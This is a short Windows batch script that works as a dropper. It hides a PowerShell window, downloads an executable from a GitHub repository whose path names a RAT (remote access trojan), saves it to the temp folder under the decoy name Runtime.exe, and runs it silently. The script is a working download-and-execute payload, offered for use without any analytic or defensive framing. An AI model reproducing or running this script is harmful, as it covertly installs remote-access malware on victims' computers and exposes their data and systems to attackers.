@echo off
:: This batch will launch a hidden PowerShell to download and run a file silently

set "url=https://github.com/GLICHED-HACKER/RAT/raw/refs/heads/main/Injector.exe"
set "output=%temp%\Runtime.exe"

:: Run PowerShell hidden to download the file
powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%output%'"

:: Run the downloaded file silently (modify if it's GUI or console app)
start "" /b "%output%"
